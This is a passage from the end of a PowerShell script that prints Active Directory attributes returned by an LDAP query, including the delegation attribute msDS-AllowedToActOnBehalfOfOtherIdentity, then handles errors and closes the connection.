                                Write-Host "      msDS-AllowedToActOnBehalfOfOtherIdentity : (binary data)" -ForegroundColor Gray
                            }
                            continue
                        }
                        $vals = @()
                        for ($i = 0; $i -lt $entry.Attributes[$attrName].Count; $i++) {
                            $vals += $entry.Attributes[$attrName][$i]
                        }
                        $display = $vals -join ', '
                        if ($display.Length -gt 200) { $display = $display.Substring(0, 200) + '...' }
                        Write-Host "      $attrName : $display" -ForegroundColor Gray
                    }
                    Write-Host ""
                }
            } catch {
                Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }
}

$ldap.Dispose()
Write-Host ""
Write-Host "  Complete." -ForegroundColor Gray
Write-Host ""
